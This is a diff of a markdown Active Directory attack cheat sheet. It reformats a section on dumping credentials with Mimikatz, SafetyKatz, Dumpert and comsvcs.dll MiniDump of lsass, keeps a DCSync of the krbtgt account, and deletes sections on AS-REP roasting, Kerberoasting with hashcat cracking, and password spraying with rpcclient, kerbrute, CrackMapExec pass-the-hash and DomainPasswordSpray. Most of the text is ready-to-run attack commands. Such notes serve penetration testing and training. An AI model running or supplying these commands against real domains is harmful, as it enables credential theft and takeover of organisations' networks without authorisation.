@@ -28,12 +28,11 @@ winrs -remote:server1 -u:server1\admin -p:password hostname
 - winrs.vbs & COM Objects of WSMan Object
 ---
 ### Mimikatz
-__Dump Creds__
+#### Dump Creds
 ```powershell
 Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 ```
 
-__Safetykatz__
 ```powershell
 safetykatz.exe "sekurlsa::ekeys"
 ```
@@ -42,9 +41,11 @@ __rundll32.exe__
 ```powershell
 rundll32.exe C:\Dumpert\Outflank-Dumpert.dll ,Dump
 ```
+
 ```powershell
 tasklist \FI "IMAGENAME eq lsass.exe"
 ```
+
 ```powershell
 rundll32.exe C:\windows\System32\comsvcs.dll ,MiniDump <lsass pid> C:\Users\Public\lsass.dmp full
 ```
@@ -77,83 +78,6 @@ Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly
 __Require Domain Admin privileges__
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync"' /user:domain.local\krbtgt
-```
-
-
-
----
-### AsReproasting
-__Pre-Authentication__ means sending encrypted timestamp before requesting TGT.
-Asreproasting occurs when a user account has the privilege "_Does not require Pre-Authentication_" enabled. 
-- Attackers can send a junk request for authentication, and the KDC will return _TGT_ for users that have Pre-Authentication disabled.
-- KDC responds with the `PRINCIPAL UNKNOWN` error for invalid usernames.
-- Whenever the KDC prompts for Kerberos Pre-Authentication, this means username exists.
-
-```bash
-GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip $IP
-```
-
-```bash
-kerbrute userenum --dc-ip $IP -d domain.local users.txt --downgrade
-```
-
-```bash
-hashcat -m 18200 -a 0 hashes.txt passwordlist.txt -O
-```
-
----
-### Kerberoasting
-Domain-connected services, such as MSSQL, web servers may be connected and issued identifiers that allow Kerberos to authenticate the service account. 
-- If a domain user account is compromised, then that account can request kerberoastable account names and their _TGS_
-- A Kerberoastable account is one that has an SPN set.
-- In order to request SPNs, a domain account is needed to make the query.
-
-```bash
-GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip $IP -request
-```
-
-```bash
-hashcat -m 13100 -a 0 hashes.txt passwordlist.txt -O
-```
-
----
-### Password Spraying
-|Tool|Ports|
-|-|-|
-|nmblookup|137/UDP|
-|nbtstat|137/UDP|
-|net|139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535|
-|rpcclient|135/TCP|
-|smbclient|445/TCP|
-
-__rpcclient__
-```bash
-for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" $IP | grep Authority; done
-```
-
-__Kerbrute__
-```shell-session
-kerbrute passwordspray -d inlanefreight.local --dc $IP valid_users.txt  Welcome1
-```
-
-__CrackMapExec__
-```bash
-sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
-```
-
-__Local Admin Spraying__
-- `--local-auth` flag will tell the tool only to attempt to _log in one time_ on each machine
-```bash
-sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
-```
-
-__[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)__
-- Automatically generate a user list from AD, query the domain password policy, and exclude user accounts within one attempt of locking out.
-```powershell
-Invoke-DomainPasswordSpray -Password Spring2017
-```
-```powershell
-Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
 ```
 
 
